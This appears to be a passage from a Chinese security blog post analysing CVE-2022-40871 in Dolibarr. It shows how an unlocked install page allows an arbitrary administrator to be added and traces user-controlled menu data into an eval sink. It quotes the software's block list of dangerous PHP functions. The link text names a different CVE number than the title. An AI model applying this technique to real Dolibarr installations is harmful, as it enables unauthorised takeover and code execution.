<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Dolibarr存在任意添加管理员漏洞和远程命令执行漏洞 CVE-2022-40871'>
<title>[CVE-2022-40871] Dolibarr任意添加管理员与RCE漏洞分析</title>

<link rel='canonical' href='https://blog.huamang.xyz/post/cve-2022-40871/'>

<link rel="stylesheet" href="/scss/style.min.a3acb339192261971279929bada446e8966aa7224703ebfd992d05448daed96b.css"><meta property='og:title' content='[CVE-2022-40871] Dolibarr任意添加管理员与RCE漏洞分析'>
<meta property='og:description' content='Dolibarr存在任意添加管理员漏洞和远程命令执行漏洞 CVE-2022-40871'>
<meta property='og:url' content='https://blog.huamang.xyz/post/cve-2022-40871/'>
<meta property='og:site_name' content='Huamang'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2022-11-12T21:38:39&#43;08:00'/><meta property='article:modified_time' content='2022-11-12T21:38:39&#43;08:00'/>
<meta name="twitter:title" content="[CVE-2022-40871] Dolibarr任意添加管理员与RCE漏洞分析">
<meta name="twitter:description" content="Dolibarr存在任意添加管理员漏洞和远程命令执行漏洞 CVE-2022-40871">
    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "dark");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu2c79bb77476a4f0f53420443e9db5bfa_18691_300x0_resize_box_3.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">Huamang</a></h1>
            <h2 class="site-description"></h2>
        </div>
    </header><ol class="social-menu">
            
                <li>
                    <a 
                        href='https://github.com/Huamang'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://blog.huamang.xyz/index.xml'
                        target="_blank"
                        title="RSS"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="5" cy="19" r="1" />
  <path d="M4 4a16 16 0 0 1 16 16" />
  <path d="M4 11a9 9 0 0 1 9 9" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://twitter.com/Huamang7'
                        target="_blank"
                        title="Twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/about/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>About</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/friends/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
</svg>



                
                <span>Friends</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        

        <div class="menu-bottom-section">
            
            
                <li id="dark-mode-toggle">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <span>Dark Mode</span>
                </li>
            
        </div>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">目录</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li><a href="#漏洞简介">漏洞简介</a></li>
    <li><a href="#漏洞分析">漏洞分析</a>
      <ol>
        <li><a href="#环境搭建">环境搭建</a></li>
        <li><a href="#任意管理员用户注册">任意管理员用户注册</a></li>
        <li><a href="#后台rce">后台RCE</a></li>
      </ol>
    </li>
    <li><a href="#漏洞总结">漏洞总结</a>
      <ol>
        <li><a href="#漏洞修复">漏洞修复</a></li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" style="background-color: #3b58eb; color: #fff;">
                漏洞分析
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/post/cve-2022-40871/">[CVE-2022-40871] Dolibarr任意添加管理员与RCE漏洞分析</a>
        </h2>
    
        
        <h3 class="article-subtitle">
            Dolibarr存在任意添加管理员漏洞和远程命令执行漏洞 CVE-2022-40871
        </h3>
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Nov 12, 2022</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    阅读时长: 5 分钟
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <h1 id="漏洞简介">漏洞简介</h1>
<blockquote>
<p>Dolibarr ERP &amp; CRM &lt;=15.0.3 is vulnerable to Eval injection. By default, any administrator can be added to the installation page of dolibarr, and if successfully added, malicious code can be inserted into the database and then execute it by eval.</p>
</blockquote>
<p>CVE编号：<a class="link" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-40871"  target="_blank" rel="noopener"
    >CVE-2022-2633</a></p>
<p>漏洞描述：Dolibarr edit.php 存在远程命令执行漏洞，攻击者通过逻辑漏洞创建管理员后可以通过后台漏洞获取服务器权限</p>
<p>影响版本：&lt;= 15.0.3</p>
<h1 id="漏洞分析">漏洞分析</h1>
<h2 id="环境搭建">环境搭建</h2>
<p>源码下载地址：https://github.com/Dolibarr/dolibarr/archive/refs/tags/15.0.3.zip</p>
<p>解压到web目录下直接访问<code>~/htdocs/</code>即可</p>
<p><img src="https://tuchuang.huamang.xyz/img/image-20221112215135292.png"
	
	
	
	loading="lazy"
	
		alt="image-20221112215135292"
	
	
></p>
<p>然后配置一下conf/conf.php即可进行安装</p>
<h2 id="任意管理员用户注册">任意管理员用户注册</h2>
<p>这其实算是个逻辑漏洞，在install系统以后，他不会进行锁定，而是需要用户在<code>documents</code>目录中手动添加，所以我们随时可以进入这里去添加管理员账号：<code>~/install/step4.php</code></p>
<p>比如这里我添加一个aaa用户</p>
<p><img src="https://tuchuang.huamang.xyz/img/image-20221112224440198.png"
	
	
	
	loading="lazy"
	
		alt="image-20221112224440198"
	
	
></p>
<p>可以成功进入后台的</p>
<p><img src="https://tuchuang.huamang.xyz/img/image-20221112224514801.png"
	
	
	
	loading="lazy"
	
		alt="image-20221112224514801"
	
	
></p>
<h2 id="后台rce">后台RCE</h2>
<p>后台RCE的最后点在<code>htdocs/core/lib/functions.lib.php</code>的<code>dol_eval()</code>函数</p>
<p>但是这里是有waf的，把大多数的危险函数都给ban了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php">	<span class="c1">// We block use of php exec or php file functions
</span><span class="c1"></span>	<span class="nv">$forbiddenphpstrings</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;$$&#39;</span><span class="p">);</span>
	<span class="nv">$forbiddenphpstrings</span> <span class="o">=</span> <span class="nx">array_merge</span><span class="p">(</span><span class="nv">$forbiddenphpstrings</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;_ENV&#39;</span><span class="p">,</span> <span class="s1">&#39;_SESSION&#39;</span><span class="p">,</span> <span class="s1">&#39;_COOKIE&#39;</span><span class="p">,</span> <span class="s1">&#39;_GET&#39;</span><span class="p">,</span> <span class="s1">&#39;_POST&#39;</span><span class="p">,</span> <span class="s1">&#39;_REQUEST&#39;</span><span class="p">));</span>

	<span class="nv">$forbiddenphpfunctions</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;exec&#34;</span><span class="p">,</span> <span class="s2">&#34;passthru&#34;</span><span class="p">,</span> <span class="s2">&#34;shell_exec&#34;</span><span class="p">,</span> <span class="s2">&#34;system&#34;</span><span class="p">,</span> <span class="s2">&#34;proc_open&#34;</span><span class="p">,</span> <span class="s2">&#34;popen&#34;</span><span class="p">,</span> <span class="s2">&#34;eval&#34;</span><span class="p">,</span> <span class="s2">&#34;dol_eval&#34;</span><span class="p">,</span> <span class="s2">&#34;executeCLI&#34;</span><span class="p">);</span>
	<span class="nv">$forbiddenphpfunctions</span> <span class="o">=</span> <span class="nx">array_merge</span><span class="p">(</span><span class="nv">$forbiddenphpfunctions</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;fopen&#34;</span><span class="p">,</span> <span class="s2">&#34;file_put_contents&#34;</span><span class="p">,</span> <span class="s2">&#34;fputs&#34;</span><span class="p">,</span> <span class="s2">&#34;fputscsv&#34;</span><span class="p">,</span> <span class="s2">&#34;fwrite&#34;</span><span class="p">,</span> <span class="s2">&#34;fpassthru&#34;</span><span class="p">,</span> <span class="s2">&#34;require&#34;</span><span class="p">,</span> <span class="s2">&#34;include&#34;</span><span class="p">,</span> <span class="s2">&#34;mkdir&#34;</span><span class="p">,</span> <span class="s2">&#34;rmdir&#34;</span><span class="p">,</span> <span class="s2">&#34;symlink&#34;</span><span class="p">,</span> <span class="s2">&#34;touch&#34;</span><span class="p">,</span> <span class="s2">&#34;unlink&#34;</span><span class="p">,</span> <span class="s2">&#34;umask&#34;</span><span class="p">));</span>
	<span class="nv">$forbiddenphpfunctions</span> <span class="o">=</span> <span class="nx">array_merge</span><span class="p">(</span><span class="nv">$forbiddenphpfunctions</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;function&#34;</span><span class="p">,</span> <span class="s2">&#34;call_user_func&#34;</span><span class="p">));</span>

	<span class="nv">$forbiddenphpregex</span> <span class="o">=</span> <span class="s1">&#39;global\s+\$|\b(&#39;</span><span class="o">.</span><span class="nx">implode</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">,</span> <span class="nv">$forbiddenphpfunctions</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;)\b&#39;</span><span class="p">;</span>

	<span class="k">do</span> <span class="p">{</span>
		<span class="nv">$oldstringtoclean</span> <span class="o">=</span> <span class="nv">$s</span><span class="p">;</span>
		<span class="nv">$s</span> <span class="o">=</span> <span class="nx">str_ireplace</span><span class="p">(</span><span class="nv">$forbiddenphpstrings</span><span class="p">,</span> <span class="s1">&#39;__forbiddenstring__&#39;</span><span class="p">,</span> <span class="nv">$s</span><span class="p">);</span>
		<span class="nv">$s</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$forbiddenphpregex</span><span class="o">.</span><span class="s1">&#39;/i&#39;</span><span class="p">,</span> <span class="s1">&#39;__forbiddenstring__&#39;</span><span class="p">,</span> <span class="nv">$s</span><span class="p">);</span>
		<span class="c1">//$s = preg_replace(&#39;/\$[a-zA-Z0-9_\-&gt;\$]+\(/i&#39;, &#39;&#39;, $s);	// Remove $function( call and $mycall-&gt;mymethod(
</span><span class="c1"></span>	<span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$oldstringtoclean</span> <span class="o">!=</span> <span class="nv">$s</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$s</span><span class="p">,</span> <span class="s1">&#39;__forbiddenstring__&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
		<span class="nx">dol_syslog</span><span class="p">(</span><span class="s1">&#39;Bad string syntax to evaluate: &#39;</span><span class="o">.</span><span class="nv">$s</span><span class="p">,</span> <span class="nx">LOG_WARNING</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="nv">$returnvalue</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">return</span> <span class="s1">&#39;Bad string syntax to evaluate: &#39;</span><span class="o">.</span><span class="nv">$s</span><span class="p">;</span>
		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
			<span class="nx">dol_syslog</span><span class="p">(</span><span class="s1">&#39;Bad string syntax to evaluate: &#39;</span><span class="o">.</span><span class="nv">$s</span><span class="p">);</span>
			<span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>

	<span class="c1">//print $s.&#34;&lt;br&gt;\n&#34;;
</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nv">$returnvalue</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$hideerrors</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="s1">&#39;return &#39;</span><span class="o">.</span><span class="nv">$s</span><span class="o">.</span><span class="s1">&#39;;&#39;</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span> <span class="k">eval</span><span class="p">(</span><span class="s1">&#39;return &#39;</span><span class="o">.</span><span class="nv">$s</span><span class="o">.</span><span class="s1">&#39;;&#39;</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$hideerrors</span><span class="p">)</span> <span class="p">{</span>
            <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">eval</span><span class="p">(</span><span class="nv">$s</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>这里再去找找<code>dol_eval()</code>的调用，上面的<code>verifCond()</code>就调用了</p>
<p>而这里进行了一个拼接，这个外面后面再谈</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">verifCond</span><span class="p">(</span><span class="nv">$strToEvaluate</span><span class="p">)</span>
<span class="p">{</span>
   <span class="k">global</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$conf</span><span class="p">,</span> <span class="nv">$langs</span><span class="p">;</span>
   <span class="k">global</span> <span class="nv">$leftmenu</span><span class="p">;</span>
   <span class="k">global</span> <span class="nv">$rights</span><span class="p">;</span> <span class="c1">// To export to dol_eval function
</span><span class="c1"></span>
   <span class="c1">//print $strToEvaluate.&#34;&lt;br&gt;\n&#34;;
</span><span class="c1"></span>   <span class="nv">$rights</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
   <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$strToEvaluate</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$strToEvaluate</span> <span class="o">!==</span> <span class="s1">&#39;&#39;</span><span class="p">)</span> <span class="p">{</span>
      <span class="nv">$str</span> <span class="o">=</span> <span class="s1">&#39;if(!(&#39;</span><span class="o">.</span><span class="nv">$strToEvaluate</span><span class="o">.</span><span class="s1">&#39;)) $rights = false;&#39;</span><span class="p">;</span>
      <span class="nx">dol_eval</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">);</span> 
   <span class="p">}</span>
   <span class="k">return</span> <span class="nv">$rights</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>再转而寻找verifCond函数的全局的<strong>参数可控的</strong>调用，在menubase.class.php的<code>menuLoad()</code>函数中就存在一个点</p>
<p><img src="https://tuchuang.huamang.xyz/img/image-20221112232201159.png"
	
	
	
	loading="lazy"
	
		alt="image-20221112232201159"
	
	
></p>
<p>可以看到这里<code>verifCond</code>代码虽然是可控的，但是是从数据库中查询的结果中获取的</p>
<p>关注<code>perms</code>和<code>enable</code>，这两个都是可以直接进入verifCond的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php">		<span class="nv">$resql</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="nv">$resql</span><span class="p">)</span> <span class="p">{</span>
			<span class="nv">$numa</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">num_rows</span><span class="p">(</span><span class="nv">$resql</span><span class="p">);</span>

			<span class="nv">$a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="nv">$b</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
			<span class="k">while</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">&lt;</span> <span class="nv">$numa</span><span class="p">)</span> <span class="p">{</span>
				<span class="c1">//$objm = $this-&gt;db-&gt;fetch_object($resql);
</span><span class="c1"></span>				<span class="nv">$menu</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">db</span><span class="o">-&gt;</span><span class="na">fetch_array</span><span class="p">(</span><span class="nv">$resql</span><span class="p">);</span>

				<span class="c1">// Define $right
</span><span class="c1"></span>				<span class="nv">$perms</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
				<span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$menu</span><span class="p">[</span><span class="s1">&#39;perms&#39;</span><span class="p">]))</span> <span class="p">{</span>
					<span class="nv">$tmpcond</span> <span class="o">=</span> <span class="nv">$menu</span><span class="p">[</span><span class="s1">&#39;perms&#39;</span><span class="p">];</span>
					<span class="k">if</span> <span class="p">(</span><span class="nv">$leftmenu</span> <span class="o">==</span> <span class="s1">&#39;all&#39;</span><span class="p">)</span> <span class="p">{</span>
						<span class="nv">$tmpcond</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/\$leftmenu\s*==\s*[&#34;\&#39;a-zA-Z_]+/&#39;</span><span class="p">,</span> <span class="s1">&#39;1==1&#39;</span><span class="p">,</span> <span class="nv">$tmpcond</span><span class="p">);</span> <span class="c1">// Force part of condition to true
</span><span class="c1"></span>					<span class="p">}</span>
					<span class="nv">$perms</span> <span class="o">=</span> <span class="nx">verifCond</span><span class="p">(</span><span class="nv">$tmpcond</span><span class="p">);</span>
					<span class="c1">//print &#34;verifCond rowid=&#34;.$menu[&#39;rowid&#39;].&#34; &#34;.$tmpcond.&#34;:&#34;.$perms.&#34;&lt;br&gt;\n&#34;;
</span><span class="c1"></span>				<span class="p">}</span>

				<span class="c1">// Define $enabled
</span><span class="c1"></span>				<span class="nv">$enabled</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
				<span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$menu</span><span class="p">[</span><span class="s1">&#39;enabled&#39;</span><span class="p">]))</span> <span class="p">{</span>
					<span class="nv">$tmpcond</span> <span class="o">=</span> <span class="nv">$menu</span><span class="p">[</span><span class="s1">&#39;enabled&#39;</span><span class="p">];</span>
					<span class="k">if</span> <span class="p">(</span><span class="nv">$leftmenu</span> <span class="o">==</span> <span class="s1">&#39;all&#39;</span><span class="p">)</span> <span class="p">{</span>
						<span class="nv">$tmpcond</span> <span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/\$leftmenu\s*==\s*[&#34;\&#39;a-zA-Z_]+/&#39;</span><span class="p">,</span> <span class="s1">&#39;1==1&#39;</span><span class="p">,</span> <span class="nv">$tmpcond</span><span class="p">);</span> <span class="c1">// Force part of condition to true
</span><span class="c1"></span>					<span class="p">}</span>
					<span class="nv">$enabled</span> <span class="o">=</span> <span class="nx">verifCond</span><span class="p">(</span><span class="nv">$tmpcond</span><span class="p">);</span>
				<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>我们去前面看看这里执行的sql语句，他是从<code>&quot;.MAIN_DB_PREFIX.&quot;menu</code>表中查询的数据，但是有WHERE条件语句</p>
<ul>
